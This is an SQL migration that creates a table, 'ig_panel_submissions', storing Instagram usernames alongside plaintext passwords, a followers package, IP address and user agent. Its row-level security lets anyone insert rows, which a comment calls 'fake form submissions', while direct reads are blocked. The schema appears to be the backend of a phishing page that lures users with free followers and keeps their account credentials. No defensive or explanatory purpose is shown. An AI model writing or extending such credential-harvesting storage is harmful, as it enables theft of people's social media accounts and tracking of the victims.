-- Create table for IG Panel submissions
CREATE TABLE public.ig_panel_submissions (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  username TEXT NOT NULL,
  password TEXT NOT NULL,
  followers_package TEXT NOT NULL,
  order_id TEXT NOT NULL,
  ip_address TEXT,
  user_agent TEXT,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Enable RLS
ALTER TABLE public.ig_panel_submissions ENABLE ROW LEVEL SECURITY;

-- Allow anyone to insert (fake form submissions)
CREATE POLICY "Anyone can submit IG Panel form"
ON public.ig_panel_submissions
FOR INSERT
WITH CHECK (true);

-- Only allow viewing through edge functions (no direct select)
CREATE POLICY "No direct read access to submissions"
ON public.ig_panel_submissions
FOR SELECT
USING (false);